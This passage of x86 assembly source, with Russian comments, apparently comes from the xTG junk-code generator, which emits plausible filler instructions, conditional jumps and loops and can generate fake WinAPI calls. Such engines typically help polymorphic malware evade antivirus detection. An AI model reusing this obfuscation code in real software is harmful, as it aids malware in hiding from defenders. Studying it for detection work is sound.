	call	[ebx].rang_addr												;etc 

	mov		edx, eax													;а вот тут как раз наоборот, между push imm8 pop reg32 - вообще ничего может не быть; 
	add		eax, 03														;3 байта - это размер push imm8 & pop reg32; 2 + 1 = 3 bytes; 
	cmp		ecx, eax
	jl		_chk_instr_

	call	get_num_free_r32											;etc 

	cmp		eax, (03 + 01)
	jl		_chk_instr_ 
	
	mov		al, 6Ah														;1 byte (opcode)
	stosb

	push	(256 - 2)													;генерируем Случайное Число (СЧ) в диапазоне [2..255]; 
	call	[ebx].rang_addr

	inc		eax
	inc		eax
	stosb																;записываем и получается [PUSH IMM8]; 
																		;edx - число - сколько байт запишем между push imm8 & pop reg32; 
	dec		ecx
	dec		ecx
	jmp		pop___r32													;переходим на генерацию [POP REG32]; 
;========================================[PUSH IMM8]=====================================================



;========================================[POP REG32]=====================================================
;POP	EAX	etc	(58h)
;etc 
pop___r32:
	call	get_free_r32												;получаем свободный рег
;--------------------------------------------------------------------------------------------------------
	mov		esi, xm_xids_addr
	assume	esi: ptr XTG_INSTR_DATA_STRUCT
	test	esi, esi													;можно ли юзать логику?
	je		_pr32_nxt_1_ 

	push	[esi].param_1												;если да, тогда для начала сохраним это поле в стэке

	sub		[esi].instr_size, ecx										;а это поле теперь равно точному размеру сгенеренного push'a
	mov		[esi].param_1, eax											;сохраняем номер рега
	or		[esi].param_1, XTG_XIDS_CONSTR								;указываем, что дальше будет генерится мусор, принадлежащий (этой) конструкции

	push	eax															;сохраним значения этих регов в стэке
	push	edx

	mov		edx, xm_struct2_addr
	assume	edx: ptr XTG_EXT_TRASH_GEN
	
	push	[edx].xlogic_struct_addr									;и вызовем функу порверки логики данной (будущей) конструкции
	push	ebx
	call	let_main

	pop		edx

	cmp		eax, 01														;если по логике проходит, тогда идём дальше
	pop		eax
	je		_pr32_nxt_0_

	pop		[esi].param_1

	mov		edi, [esi].instr_addr										;иначе коррекируем значения и выходим
	mov		ecx, [esi].norb
	jmp		_chk_instr_

_pr32_nxt_0_:
	push	[esi].instr_addr											;сохраням значения данных полей, так как они могут измениться (так как щас будет рекурсия)
	push	[esi].instr_size
	push	[esi].flags 
	push	[esi].norb

	and		[esi].instr_addr, 0											;сбрасываем адрес в 0 - это нужно для того, чтобы дальше мы снова не проверили эту конструкцию по логике, а проверяли уже новые сгенеренные будущие команды

_pr32_nxt_1_:
	xchg	eax, esi													;esi = номер регистра
;--------------------------------------------------------------------------------------------------------
	push	[ebx].tw_trash_addr											;сохраняем в стеке поля структуры: адрес для дальнейшей записи мусора, 
	push	[ebx].trash_size											;число - сколько мусора надо сгенерировать;
	push	[ebx].nobw													;(данное значение заполняется самим xTG) - сколько мусора реально записано (кол-во байт); 
	push	[ebx].fregs
	mov		[ebx].tw_trash_addr, edi									;и ставим новые значения - так как ща будет рекурсия;
	mov		[ebx].trash_size, edx	
	and		[ebx].nobw, 0
	
	mov		xm_tmp_reg0, esi											;залочим рег, чтобы не юзать в других командах (иначе может быть неправильная логика); 
	call	set_r32
	
	push	xm_struct2_addr
	push	ebx
	call	xtg_main													;рекурсивно вызываем XTG;

	mov		edx, [ebx].nobw												;далее в edx сохраняем кол-во записанных байт (трэш); 
	add		edi, edx 													;корректируем edi;
	pop		[ebx].fregs													;сохраняли и восстановили это поле - поэтому не потребовалось вызывать unset_r32; 
	pop		[ebx].nobw													;восстанавливаем из стэка ранее сохраненные значения; 
	pop		[ebx].trash_size
	pop		[ebx].tw_trash_addr

	xchg	eax, esi
	add		al, 58h														;и записываем [POP REG32]
	stosb
	dec		ecx															;корректируем кол-во оставшихся байт для записи трэша;
	sub		ecx, edx 													;и тут тоже;
;--------------------------------------------------------------------------------------------------------
	mov		esi, xm_xids_addr
	assume	esi: ptr XTG_INSTR_DATA_STRUCT
	test	esi, esi													;логику можно юзать?
	je		_pr32_nxt_2_
	pop		[esi].norb													;восстанавливаем ранее сохранённые значения полей
	pop		[esi].flags
	pop		[esi].instr_size
	pop		[esi].instr_addr
	pop		[esi].param_1 
	and		[esi].instr_addr, 0											;снова сьрасываем в 0 - для правильного построения/проверки логики
;--------------------------------------------------------------------------------------------------------
_pr32_nxt_2_:
	jmp		_chk_instr_													;на выход! 
;========================================[POP REG32]=====================================================

;================================[PUSH REG32/IMM8   POP REG32]===========================================



;=====================================[CMP REG32, REG32]=================================================
;CMP	EAX, ECX	etc	(3Bh)
cmp___r32__r32:
	push	(300h - 06)													;300h - 1 -> максимальное кол-во байт между адресом перехода и адресом, куда будет прыжок; 
	call	[ebx].rang_addr

	xchg	eax, edx

	push	edx
	call	[ebx].rang_addr

	and		edx, eax													;отфильтруем выпавшее СЧ; 
	add		edx, 06														;чтобы СЧ > 0; 
	mov		eax, edx
	add		eax, (2 + 6)												;2 (байта - размер cmp___r32__r32) + 6 (байт - максимальный размер перехода (near)); 
	cmp		ecx, eax													;если кол-во оставшихся байт для генерации мусора меньше необходимого числа байт для генерации данной конструкции, то на выход (закрутил блин=)) 
	jl		_chk_instr_
	mov		al, 3Bh														;опкод 
	stosb																;1 byte; 
	push	edx															;сохраним в стеке число (это кол-во байт между адресом будущего перехода и адресом, куда будет переход); 

_cmp_r32_r32_mm114r32_1_:	
	call	modrm_mod11_for_r32											;генерируем байт modrm (2 byte); 

	mov		edx, xm_tmp_reg1
	cmp		edx, xm_tmp_reg2											;если регистры одинаковые (например cmp eax, eax etc), то снова выбрем другие регистры - разные (например, cmp ecx, edx); 
	je		_cmp_r32_r32_mm114r32_1_ 
	stosb																;2 byte; 
	pop		edx 
	dec		ecx															;скорректируем количество оставшихся для записи трэша байтеков; 
	dec		ecx 
	cmp		edx, 80h													;и определяем, на генерацию какого перехода прыгнем (short or near); 
	jl		_jsdrel8_entry_ 
	jmp		_jndrel32_entry_
;=====================================[CMP REG32, REG32]=================================================	 
 


;=====================================[CMP REG32, IMM8]==================================================
;CMP	EAX, 1	etc	(83h 0FX)
;etc 
cmp___r32__imm8:
	push	(300h - 06)
	call	[ebx].rang_addr

	xchg	eax, edx

	push	edx
	call	[ebx].rang_addr

	and		edx, eax
	add		edx, 06														;for add/sub/etc reg32, imm32 etc; (чтобы рег точно смог принять новое для себя значение (это для логики)); 
	mov		eax, edx 
	add		eax, (3 + 6)												;3 bytes (размер cmp___r32__imm8) + 6 bytes (максимальный размер будущего условного перехода (near)); 
	cmp		ecx, eax
	jl		_chk_instr_ 
	mov		al, 83h
	stosb																;write 1 byte
	push	edx

	call	get_free_r32												;get random free reg;

	add		al, 0F8h
	stosb																;write 2 byte

_cmp_r32_imm8_grn_:
	push	(256 - 1)
	call	[ebx].rang_addr												;get random number [1..255]; 

	inc		eax 														;imm8 > 0; 
	stosb																;write 3 byte; 
	pop		edx
	sub		ecx, 03
	cmp		edx, 80h													;next generate jxx_short or jxx_near? 
	jl		_jsdrel8_entry_
	jmp		_jndrel32_entry_
;=====================================[CMP REG32, IMM8]==================================================	 
	


;=====================================[CMP REG32, IMM32]=================================================
;[CMP REG32, IMM32] -> REG != EAX; 
;CMP	ECX, 12345678h	etc	(81h 0FXh XXXXXXXXh) 
cmp___r32__imm32:

OFS_CMP_81FXh		equ		01
OFS_CMP_EAX_3Dh		equ		01

	push	(300h - 06)														;получаем СЧ в [00h..2FFh]
	call	[ebx].rang_addr

	xchg	eax, edx													;сохраняем в edx

	push	edx															;СЧ в [00h..edx]
	call	[ebx].rang_addr

	and		edx, eax													;это типо такая хитрая маска
	add		edx, 06														;+6 -> так как мы после cmp сразу будем генерить jxx, то между адресом jxx и адресом, куда мы прыгнем, должен быть хотя бы один байт - иначе хуйня будет; 
	mov		eax, edx													;EAX = EDX
	add		eax, (6 + 6)												;EAX += 12 -> 6 байт (размер данного cmp) + 6 байт (размер максимального перехода (near)); 
	cmp		ecx, eax													;если кол-во оставшихся байт для записи трэша меньше нужного нам значения для генерации данной конструкции, то на выход; 
	jl		_chk_instr_

	push	(OFS_CMP_81FXh + OFS_CMP_EAX_3Dh)							;иначе случайным образом определим (заюзав статистику), какой именно cmp будем генерить: c ECX/EDX/EBX/ESI/EDI или с EAX? (для EAX есть оптимизированная спец. версия данной команды - и соотв-но другой опкод); 
	call	[ebx].rang_addr

	cmp		eax, OFS_CMP_EAX_3Dh										;[CMP EAX, XXXXXXXXh]
	jl		cmp___eax__imm32
	push	edx															;сохраняем EDX - сколько байт сгенерировать между адресом jxx и адресом, куда будет прыжок; 
_cmp_81FXh_:
	mov		al, 81h														;1 byte (opcode)
	stosb

_cmp_r32_imm32_gfr32_:	
	call	get_free_r32												;получим случайный рег

	test	eax, eax													;если выпал EAX, то снова будем выбирать;
	je		_cmp_r32_imm32_gfr32_
	add		al, 0F8h													;иначе сгенерим 2 байт (modrm); 
	stosb

_cmp_r32_imm32_grn_:	
	push	-01															;далее сгенерим СЧ [0x101..0xFFFFFFFF]; 
	call	[ebx].rang_addr

	cmp		eax,  101h 
	jb		_cmp_r32_imm32_grn_
	stosd																;запишем следующие 4 байта (imm32 > 100h); 
_cmp_r32_imm32_gni_:
	pop		edx															;восстанавливаем EDX;
	sub		ecx, 06														;корректируем кол-во оставшихся байт для записи трэша; 
	cmp		edx, 80h													;next generate jxx_short or jxx_near? 
	jl		_jsdrel8_entry_
	jmp		_jndrel32_entry_

;========================================================================================================
;[CMP EAX, XXXXXXXXh]
;CMP	EAX, 12345678h	etc	(3Dh); 
cmp___eax__imm32:
	cmp		ecx, 05
	jl		_chk_instr_
	mov		al, 3Dh														;1 byte (opcode);
	stosb
	push	edx															;etc
	inc		ecx															;корректируем кол-во оставшихся байт для записи мусора; 
	jmp		_cmp_r32_imm32_grn_
;=====================================[CMP REG32, IMM32]=================================================

	

;================================[TEST REG32/REG8, REG32/REG8]===========================================
;TEST	EAX, EAX	etc	(85h)
;TEST	CH, CH		etc	(84h)  
;etc 
test___r32_r8__r32_r8:

OFS_TEST_85h		equ		25
OFS_TEST_84h		equ		02

;OFS_TJSDREL8		equ		30
;OFS_TJNDREL32		equ		15
	push	(300h - 06) ;7Fh											;получим СЧ в [00h..2FFh] -> это max значение для jxx_near; 
	call	[ebx].rang_addr

	xchg	eax, edx													;сохраняем СЧ в EDX; 

	push	edx
	call	[ebx].rang_addr

	;and	edx, eax

	;push	edx
	;call	[ebx].rang_addr
																		;тут типо хитрая маска
	and		edx, eax
	add		edx, 06														;etc
	mov		eax, edx 
	add		eax, (02 + 06)												;2 bytes (размер test) + 6 байт (максимальный размер jxx (это near)); 
	cmp		ecx, eax
	jl		_chk_instr_ 
	push	edx															;etc

	push	(OFS_TEST_85h + OFS_TEST_84h)
	call	[ebx].rang_addr

	cmp		eax, OFS_TEST_84h
	jl		_84h_
_85h_:
	mov		al, 85h														;[TEST REG32, REG32]
	jmp		_84h_85h_
_84h_:
	mov		al, 84h														;[TEST REG8, REG8]
_84h_85h_:
	stosb

	call	get_free_r32												;get_rnd_r

	mov		edx, eax													;а вот тут делаем так, чтобы реги были одинаковые, так как test (почти) всегда применяется именно для сравнения одного и того же рега, например, test eax, eax etc; 
	shl		eax, 03
	add		al, 0C0h
	add		eax, edx
	stosb
	pop		edx
	dec		ecx
	dec		ecx	
	cmp		edx, 80h													;etc 
	jl		_jsdrel8_entry_ 											;и далее прыгаем на генерацию jxx (SHORT or NEAR); 
	jmp		_jndrel32_entry_ 
;================================[TEST REG32/REG8, REG32/REG8]===========================================



;====================================[JXX_SHORT_DOWN REL8]===============================================
;JL		IMM8	etc	(7Ch)
;JE		IMM8	etc	(74h)
;JNZ	IMM8	etc	(75h) 
;etc
jxx_short_down___rel8:

OFS_JXX_74h			equ		35
OFS_JXX_75h			equ		25
OFS_JXX_7Xh			equ		01
	
	push	7Fh															;генерируем СЧ [01h..7Fh]
	call	[ebx].rang_addr

	inc		eax
	mov		edx, eax													;сохраняем это СЧ в edx; 
	inc		eax															;EAX += 2 -> 2 байта - это размер данного jxx;
	inc		eax
	cmp		ecx, eax													;etc 
	jl		_chk_instr_

_jsdrel8_entry_:
;--------------------------------------------------------------------------------------------------------
	mov		esi, xm_xids_addr
	assume	esi: ptr XTG_INSTR_DATA_STRUCT
	test	esi, esi													;можно ли юзать логику?
	je		_jsdr8l_nxt_1_ 

	push	[esi].param_1												;если да, тогда для начала сохраним это поле в стэке

	sub		[esi].instr_size, ecx										;а это поле теперь равно точному размеру сгенеренной команды
	or		[esi].param_1, XTG_XIDS_CONSTR								;указываем, что дальше будет генерится мусор, принадлежащий (этой) конструкции

	push	edx

	mov		edx, xm_struct2_addr
	assume	edx: ptr XTG_EXT_TRASH_GEN
	
	push	[edx].xlogic_struct_addr									;и вызовем функу порверки логики данной (будущей) конструкции
	push	ebx
	call	let_main

	pop		edx

	cmp		eax, 01														;если по логике проходит, тогда идём дальше
	je		_jsdr8l_nxt_0_

	pop		[esi].param_1

	mov		edi, [esi].instr_addr										;иначе коррекируем значения и выходим
	mov		ecx, [esi].norb
	jmp		_chk_instr_

_jsdr8l_nxt_0_:
	push	[esi].instr_addr											;сохраням значения данных полей, так как они могут измениться (так как щас будет рекурсия)
	push	[esi].instr_size
	push	[esi].flags 
	push	[esi].norb

	and		[esi].instr_addr, 0											;сбрасываем адрес в 0 - это нужно для того, чтобы дальше мы снова не проверили эту конструкцию по логике, а проверяли уже новые сгенеренные будущие команды

_jsdr8l_nxt_1_:
;-------------------------------------------------------------------------------------------------------- 
	push	[ebx].tw_trash_addr											;сохраним в стэке нужные поля структуры;
	push	[ebx].trash_size
	push	[ebx].nobw
	push	edi															;и текущий адрес для записи трэша
	inc		edi															;перепрыгнем на 2 байта вперёд - на месте этих 2-х байт чуть позже запишем jxx; 
	inc		edi
	mov		[ebx].tw_trash_addr, edi
	mov		[ebx].trash_size, edx	
	and		[ebx].nobw, 0
	
	push	xm_struct2_addr
	push	ebx
	call	xtg_main													;вызываем трэшген рекурсивно

	pop		edi															;восстанавливаем из стэка ранее сохраненные значения;
	mov		edx, [ebx].nobw												;в EDX - число реально записанных (после рекурсии) байт (трэш); 
	pop		[ebx].nobw
	pop		[ebx].trash_size
	pop		[ebx].tw_trash_addr
	;test	edx, edx
	;je		_chk_instr_

 	push	(OFS_JXX_74h + OFS_JXX_75h + OFS_JXX_7Xh)					;далее, юзая стату, "случайно" определим, какой jxx будем генерить; 
 	call	[ebx].rang_addr

 	cmp		eax, OFS_JXX_7Xh
 	jl		_7Xh_
 	cmp		eax, (OFS_JXX_7Xh + OFS_JXX_75h)
 	jge		_74h_
_75h_:																	;[JNE REL8]
	mov		al, 75h
	jmp		_7Xh_75h_74h_
_74h_:																	;[JE REL8]
	mov		al, 74h
	jmp		_7Xh_75h_74h_

_7Xh_:																	;а тут выберем случайно один из 16 возможных jxx; 
	push	16
	call	[ebx].rang_addr

	add		al, 70h
_7Xh_75h_74h_:
	stosb																;1 byte (opcode)
	xchg	eax, edx
	stosb																;2 byte (imm8) 
	dec		ecx
	dec		ecx
	add		edi, eax													;скорректируем адрес для дальнейшей записи мусора
	sub		ecx, eax													;скорректируем счётчик; 
;--------------------------------------------------------------------------------------------------------
	mov		esi, xm_xids_addr
	assume	esi: ptr XTG_INSTR_DATA_STRUCT
	test	esi, esi													;логику можно юзать?
	je		_jsdr8l_nxt_2_
	pop		[esi].norb													;восстанавливаем ранее сохранённые значения полей
	pop		[esi].flags
	pop		[esi].instr_size
	pop		[esi].instr_addr
	pop		[esi].param_1 

	test	eax, eax													;если не было сгенерировано ни одной команды между переходом и адресом, куда прыгаем - тогда откатываем эту конструкцию и прыгаем на генерацию других команд; 
	jne		_jsdr8l_nxt_3_
	mov		edi, [esi].instr_addr
	mov		ecx, [esi].norb
	;jmp		_chk_instr_

_jsdr8l_nxt_3_:
	and		[esi].instr_addr, 0											;снова сбрасываем в 0 - для правильного построения/проверки логики
;--------------------------------------------------------------------------------------------------------
_jsdr8l_nxt_2_:
	jmp		_chk_instr_
;====================================[JXX_SHORT_DOWN REL8]===============================================

 

;====================================[JXX_NEAR_DOWN REL32]===============================================
;JL		REL32	etc	(0Fh 8Ch)
;JNE	REL32	etc	(0Fh 85h)
;JE		REL32	etc	(0Fh 84h)
;etc 
jxx_near_down___rel32:

OFS_JXX_0F84h		equ		35
OFS_JXX_0F85h		equ		25
OFS_JXX_0F8Xh		equ		01

	push	300h
	call	[ebx].rang_addr

	cmp		eax, 81h													;СЧ [81h..2FFh]
	jl		jxx_near_down___rel32
	mov		edx, eax
	add		eax, 06														;6 bytes (size of jxx_near); 
	cmp		ecx, eax													;etc 
	jl		_chk_instr_

_jndrel32_entry_:
;--------------------------------------------------------------------------------------------------------
	mov		esi, xm_xids_addr
	assume	esi: ptr XTG_INSTR_DATA_STRUCT
	test	esi, esi													;можно ли юзать логику?
	je		_jsdr32l_nxt_1_ 

	push	[esi].param_1												;если да, тогда для начала сохраним это поле в стэке

	sub		[esi].instr_size, ecx										;а это поле теперь равно точному размеру сгенеренной команды; 
	or		[esi].param_1, XTG_XIDS_CONSTR								;указываем, что дальше будет генерится мусор, принадлежащий (этой) конструкции

	push	edx

	mov		edx, xm_struct2_addr
	assume	edx: ptr XTG_EXT_TRASH_GEN
	
	push	[edx].xlogic_struct_addr									;и вызовем функу порверки логики данной (будущей) конструкции
	push	ebx
	call	let_main

	pop		edx

	cmp		eax, 01														;если по логике проходит, тогда идём дальше
	je		_jsdr32l_nxt_0_

	pop		[esi].param_1

	mov		edi, [esi].instr_addr										;иначе коррекируем значения и выходим
	mov		ecx, [esi].norb
	jmp		_chk_instr_

_jsdr32l_nxt_0_:
	push	[esi].instr_addr											;сохраням значения данных полей, так как они могут измениться (так как щас будет рекурсия)
	push	[esi].instr_size
	push	[esi].flags 
	push	[esi].norb

	and		[esi].instr_addr, 0											;сбрасываем адрес в 0 - это нужно для того, чтобы дальше мы снова не проверили эту конструкцию по логике, а проверяли уже новые сгенеренные будущие команды
;--------------------------------------------------------------------------------------------------------
_jsdr32l_nxt_1_:

	push	[ebx].tw_trash_addr
	push	[ebx].trash_size
	push	[ebx].nobw
	push	edi
	add		edi, 06														;etc (смотри в сорцы=)! 
	mov		[ebx].tw_trash_addr, edi
	mov		[ebx].trash_size, edx	
	and		[ebx].nobw, 0
	
	push	xm_struct2_addr
	push	ebx
	call	xtg_main

	pop		edi
	mov		edx, [ebx].nobw
	pop		[ebx].nobw
	pop		[ebx].trash_size
	pop		[ebx].tw_trash_addr
	;test	edx, edx
	;je		_chk_instr_

	mov		al, 0Fh														;1 byte (1-st opcode)
	stosb

	push	(OFS_JXX_0F84h + OFS_JXX_0F85h + OFS_JXX_0F8Xh)
	call	[ebx].rang_addr

	cmp		eax, OFS_JXX_0F8Xh
	jl		_0F8Xh_
	cmp		eax, (OFS_JXX_0F8Xh + OFS_JXX_0F85h)
	jge		_0F84h_
_0F85h_:																;[JNE REL32]
	mov		al, 85h
	jmp		_0F8Xh_0F85h_0F84h_
_0F84h_:																;[JE REL32]
	mov		al, 84h
	jmp		_0F8Xh_0F85h_0F84h_

_0F8Xh_:																;other (16 variants)
	push	16
	call	[ebx].rang_addr

	add		al, 80h
_0F8Xh_0F85h_0F84h_:
	stosb																;2 byte (2-nd opcode)
	xchg	eax, edx
	stosd																;+4 bytes (rel32);
	sub		ecx, 06														;корректируем; 
	sub		ecx, eax
	add		edi, eax
;--------------------------------------------------------------------------------------------------------
	mov		esi, xm_xids_addr
	assume	esi: ptr XTG_INSTR_DATA_STRUCT
	test	esi, esi													;логику можно юзать?
	je		_jsdr32l_nxt_2_
	pop		[esi].norb													;восстанавливаем ранее сохранённые значения полей
	pop		[esi].flags
	pop		[esi].instr_size
	pop		[esi].instr_addr
	pop		[esi].param_1 

	test	eax, eax													;если ни одной команды не было сгенерено между командой перехода и адресом, куда будет прыжок - тогда откатываем данную конструкцию и переходим на генерацию других команд; 
	jne		_jsdr32l_nxt_3_
	mov		edi, [esi].instr_addr
	mov		ecx, [esi].norb
	;jmp		_chk_instr_

_jsdr32l_nxt_3_:
	and		[esi].instr_addr, 0											;снова сбрасываем в 0 - для правильного построения/проверки логики
;--------------------------------------------------------------------------------------------------------
_jsdr32l_nxt_2_:

	jmp		_chk_instr_ 
;====================================[JXX_NEAR_DOWN REL32]===============================================



;=====================================[JXX_UP REL8/REL32]================================================
;1) init_reg1															;push imm8  pop reg32_1; mov reg32_1, imm32; etc
;	trash1
;	trash2
;	chg_reg1															;inc/dec reg32_1; add/sub reg32_1, imm8; etc
;	trash3
;	cmp_reg1, value														;cmp reg32_1, imm8; cmp reg32_1, imm32; etc 
;	jxx trash2															;jl/jle/jg/jge; 
;
;2) init_reg1
;	trash1
;	trash2
;	dec reg1
;	jnz trash2
;
;3) trash1
;	trash2
;	chg_reg1
;	trash3
;	cmp_reg1, reg2														;cmp reg32_1, reg32_2; 
;	je trash2
;  
;4)	etc (разные команды, реги, и т.п., возможны вложенные циклы, jxx_short, jxx_near);  
;
jxx_up___rel8___rel32:
	call	get_num_free_r32											;вначале вызовем функу получения количества свободных reg32; 

	cmp		eax, (03 + 02)												;03 - это минимальное кол-во свободных регистров, чтобы трэшген нормульно работал (режим "реалистичность"); 
	jl		_chk_instr_													;02 - это минимальное кол-во свободных регов для данной конструкции - так как для неё может потребоваться 1 или 2 рега; 
																		;если кол-во свободных регов < (03 + 02 = 05), тогда на выход; 2FEh + 2 = 300h - округленный маx размер trash2; 
	push	(2FEh - 05 - 03 - 06 - 06)									;05 - максимальный размер команды инициализации счётчика (рега) - это команда mov reg32, imm32; 
	call	[ebx].rang_addr												;03 - -||- команды изменения счётчика - это add/sub reg32, imm8;
																		;06 - -||- команды сравнения - это cmp reg32, imm32 (reg32 != EAX);
																		;06 - максимальный размер условного перехода (jxx_near = 6 bytes); 
	xchg	eax, edx

	push	edx
	call	[ebx].rang_addr

	and		eax, edx													;применяем спец. маску для получения "взвешенного" значения; 
	inc		eax															;rel > 1; мы включаем в прыжок и команду инициализации, изменения счётчка, сравнения и т.п., а также мусорные команды; 
	inc		eax
	mov		xm_tmp_reg3, eax											;размер trash2 сохраним в xm_tmp_reg3; 
	mov		edx, (2FEh - 05 - 03 - 06 - 06 + 01)
	sub		edx, eax
	xchg	eax, esi													;esi = eax; 

	push	edx
	call	[ebx].rang_addr
	
	push	eax
	call	[ebx].rang_addr

	and		eax, edx
	mov		xm_tmp_reg4, eax											;размер мусора trash3 сохраним в xm_tmp_reg4; 
	add		esi, eax													;esi += eax;

	push	50h
	call	[ebx].rang_addr

	mov		xm_tmp_reg5, eax											;размер мусора trash1 [0..0x50 - 0x01] сохраним в xm_tmp_reg5; 
	add		esi, eax													;esi += eax
	add		esi, (05 + 03 + 06 + 06)									;добавим также в esi max размеры команд инициализации счётчика etc; 
	cmp		ecx, esi													;если кол-во оставшихся для записи мусора байт меньше кол-ва нужных байт для генерации данной конструкции, то выйдем нахер отсюда; 
	jl		_chk_instr_

	push	[ebx].tw_trash_addr											;сохраним в стеке нужные нам поля структуры, так как они будут изменены (для рекурсивного вызова трэшгена); 
	push	[ebx].trash_size
	push	[ebx].fregs													;сохраним в стеке данное поле - тогда нам не нужно следить за xm_tmp_reg0, и после вызова set_r32 вызывать unset_r32; 
	push	[ebx].xmask1
	push	[ebx].xmask2
	push	[ebx].nobw
																		;!!!!! возможно добавить проверку на рекурсию! чтобы не обвалился стэк; 
																		;тут (в конструкции генерации цикла) отключаем генерацию винапишек;
																		;иначе может быть зацикливание и т.п. тупняк. 
																		;например, у нас сгенерился цикл, в котором счётчик - это рег edx. И в цикле сгенерировался вызов винапи. 
																		;после вызова может быть так, что рег edx примет какое-то другое значение - получается мы похерачим значение счётчика для цикла - а значит цикл может стать бесконечнным и т.п.;
																		;вот так; 
	cmp		[ebx].fmode, XTG_REALISTIC									;какой режим сейчас юзается?
	jne		_jsu_rel8_chk_flag_winapi_m_
_jsu_rel8_chk_flag_winapi_r_:											;для режимов маски и реалистика разные флаги, указывающие, что надо генерить фэйк-винапи функи; 
	test	[ebx].xmask1, XTG_REALISTIC_WINAPI
	je		_jsu_rel8_xmask_ok_
	xor		[ebx].xmask1, XTG_REALISTIC_WINAPI							;отключаем
	jmp		_jsu_rel8_xmask_ok_

_jsu_rel8_chk_flag_winapi_m_:
	test	[ebx].xmask2, XTG_MASK_WINAPI
	je		_jsu_rel8_xmask_ok_
	xor		[ebx].xmask2, XTG_MASK_WINAPI								;etc 

_jsu_rel8_xmask_ok_:

	call	get_free_r32												;иначе получим свободный регистр - это наш счётчик в цикле; 
	
	mov		xm_tmp_reg1, eax											;сохраним его в xm_tmp_reg1
	mov		xm_tmp_reg0, eax											;а также залочим его, чтобы не юзать в других командах (иначе может быть зацикливание); 
	call	set_r32
	;push	xm_tmp_reg0 												;данная команда закоментена, так как мы сохранили [ebx].fregs в стэке, поэтому нам не потребуется делать xm_tmp_reg0 и вызывать unset_r32; 

	push	02
	call	[ebx].rang_addr												;далее случайно определим, будем ли мы генерить команду инициализации счётчика или же подключим 2-ой регистр? 
	 
	test	eax, eax
	je		_jsu_rel8_init_cnt_

_jsu_rel8_init_reg2_:													;тут подключаем 2-ой регистр (он будет нужен для команды cmp reg1, reg2); 
	call	get_free_r32
	mov		xm_tmp_reg2, eax
	mov		xm_tmp_reg0, eax
	call	set_r32
	
	jmp		_jsu_rel8_trash1_
_jsu_rel8_init_cnt_:													;а тут генерим команду инициализации счётчика (aka регистр aka reg1 etc); например push imm8  pop reg1 etc; 
	call	init_cnt_for_cycle
	mov		xm_tmp_reg2, -01											;xm_tmp_reg2 = -1 -> тем самым мы указываем, что 2-ой рег нам не нужен; 
	xchg	eax, edx													;edx = eax = число - это значение, которое было присвоено счётчику (инициализация); 

_jsu_rel8_trash1_:	
;--------------------------------------------------------------------------------------------------------
	cmp		xm_xids_addr, 0												;можно ли юзать логику? 
	je		_vju_nxt_1_ 
	
	push	esi
	mov		esi, xm_xids_addr
	assume	esi: ptr XTG_INSTR_DATA_STRUCT	
	push	ecx
	push	edx
	push	[esi].param_1												;если да, тогда для начала сохраним это поле в стэке
	
	mov		eax, xm_tmp_reg1
	mov		[esi].param_1, eax											;закатываем сюда номер рега1 для проверки
	mov		edx, xm_struct2_addr
	assume	edx: ptr XTG_EXT_TRASH_GEN
	
	push	[edx].xlogic_struct_addr									;и вызовем функу пр0верки логики данной (будущей) конструкции
	push	ebx
	call	let_main

	cmp		eax, 01														;если же конструкта завалива свою проверку ( на первом реге ), тогда перепрыгиваем
	jne		_vju_nxt_2_

	mov		ecx, xm_tmp_reg2
	inc		ecx
	je		_vju_nxt_2_
	dec		ecx															;если данная конструкта юзает и рег2, 

	mov		[esi].param_1, ecx											;тогда проверим и его тоже

	push	[edx].xlogic_struct_addr									;и вызовем функу порверки логики данной (будущей) конструкции
	push	ebx
	call	let_main

_vju_nxt_2_:
	pop		[esi].param_1
	pop		edx
	pop		ecx
	cmp		eax, 01														;если по логике проходит, тогда идём дальше
	je		_vju_nxt_3_

	mov		edi, [esi].instr_addr										;иначе коррекируем значения и выходим
	mov		ecx, [esi].norb 
	pop		esi
	jmp		_vju_nxt_4_													;переходим на восстановление других полей другой структы etc; 

_vju_nxt_3_:
	pop		eax 
	push	[esi].param_1 
	or		[esi].param_1, XTG_XIDS_CONSTR								;указываем, что дальше будет генерится мусор, принадлежащий (этой) конструкции
	and		[esi].instr_addr, 0											;сбрасываем адрес в 0 - это нужно для того, чтобы дальше мы снова не проверили эту конструкцию по логике, а проверяли уже новые сгенеренные будущие команды
	xchg	eax, esi													;esi = eax; 
;--------------------------------------------------------------------------------------------------------
_vju_nxt_1_:
	
	mov		[ebx].tw_trash_addr, edi									;адрес для записи мусора;
	mov		eax, xm_tmp_reg5											;eax = сколько мусора сгенерить (trash1); 
	mov		[ebx].trash_size, eax	
	and		[ebx].nobw, 0												;обнуляем - данное поле показывает на выходе, сколько реально мусора было записано (кол-во байтов); 
	
	push	xm_struct2_addr
	push	ebx
	call	xtg_main													;генерим пачку мусора (trash1) (рекурсия); 

	add		edi, [ebx].nobw												;корректируем edi - теперь в нем адрес за trash1, как нам и нужно;
	sub		ecx, [ebx].nobw												;корректируем ecx - кол-во оставшихся байт для записи дальнейшего мусора; 

_jsu_rel8_trash2_:
;--------------------------------------------------------------------------------------------------------
	push	esi
	mov		esi, xm_xids_addr 
	assume	esi: ptr XTG_INSTR_DATA_STRUCT	
	test	esi, esi
	je		_vju_t2_nxt_
	and		[esi].instr_addr, 0											;перед каждой рекурсией сбрасываем данное поле в 0, чтобы далее проверялись на логику новые команды, а не снова эта конструкта и т.п.; 
_vju_t2_nxt_:
	pop		esi
;--------------------------------------------------------------------------------------------------------

	mov		[ebx].tw_trash_addr, edi									;etc
	mov		eax, xm_tmp_reg3											;trash2
	mov		[ebx].trash_size, eax
	and		[ebx].nobw, 0

	push	xm_struct2_addr
	push	ebx
	call	xtg_main

	mov		xm_tmp_reg3, edi											;теперь переменная xm_tmp_reg3 содержит адрес начала trash2 (вот сюда в дальнейшем будет наш переход в цикле); 
	add		edi, [ebx].nobw
	sub		ecx, [ebx].nobw 

	call	chg_cnt_for_cycle											;теперь генерируем команду изменения счётчика, например, inc/dec reg1 или add/sub reg1, imm8 etc; 
	mov		xm_tmp_reg5, eax											;xm_tmp_reg5 теперь содержит адрес команды изменения счётчика;
	xchg	eax, esi													;сохраним этот адрес в esi; 

	cmp		byte ptr [esi], 48h											;далее, проверяем, была сгенерирована команда inc reg1?
	jb		_jsu_rel8_nxt_1_
	cmp		byte ptr [esi], 4Fh											;или dec reg1?
	jbe		_jsu_rel8_nxt_2_
	cmp		byte ptr [esi + 01], 0C7h									;или add reg1, imm8 или sub reg1, imm8?
	ja		_jsu_rel8_nxt_3_
_jsu_rel8_nxt_1_:														;если была сгенерирована команда увеличения счётчика (inc или add etc), тогда обнулим esi; 
	xor		esi, esi
